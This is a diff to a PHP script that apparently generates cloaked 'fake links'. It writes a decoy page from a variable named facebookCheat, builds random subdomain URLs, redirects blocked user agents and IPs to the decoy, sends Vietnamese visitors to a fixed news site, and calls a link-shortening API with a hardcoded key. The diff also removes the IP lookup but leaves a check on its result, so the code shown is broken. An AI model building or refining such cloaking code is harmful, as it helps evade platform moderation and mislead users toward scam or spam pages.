@@ -189,7 +189,7 @@ if ($_POST["url"]) {
     fwrite($fFakeLink, $facebookCheat);
     fclose($fFakeLink);
 
-    $linkHtmlFake = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $fakeLinkHtml;
+    $linkHtmlFake = 'http://' . $subs[array_rand($subs)] . $_SERVER['HTTP_HOST'] . '/' . $fakeLinkHtml;
     $fakelink = $randomUrlOne . '/' . $fakeLinkHtml;
 
     $redirectUrl = addHttp($_POST['url']);
@@ -215,17 +215,8 @@ function checkIP($ip)
     }
 }
 
-function ipDetails($ip)
-{
-    $json = file_get_contents("http://ipinfo.io/{$ip}");
-    $details = json_decode($json);
-    return $details;
-}
-
 $allowedAgents = "allowedAgents' . $pathname . '.txt";
 $blockedAgents = "blockedAgents' . $pathname . '.txt";
-
-$details = ipDetails($_SERVER[\'REMOTE_ADDR\']);
 
 $ip = ip2long($_SERVER[\'REMOTE_ADDR\']);
 
@@ -237,7 +228,7 @@ if (
     $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' blocked \' . PHP_EOL;
     fwrite($fAgent, $agent);
     fclose($fAgent);
-    header(\'Location: ' . $fakeLink . '\', true, 301);
+    header(\'Location: ' . $linkHtmlFake . '\', true, 301);
     die();
 } elseif ($details->country === \'VN\') {
     header(\'Location: http://philnews.info\', true, 301);
@@ -255,7 +246,7 @@ if (
     fwrite($fphp, $phpString);
     fclose($fphp);
 
-    $lurl = 'http://' . $_POST['user'] . generateRandomString(7) . '.' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
+    $lurl = 'http://' . $subs[array_rand($subs)] . '.' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
     $curl = curl_init();
     $post_data = array('format' => 'text',
         'apikey' => '85D97C460CDBCAEBIB5A',
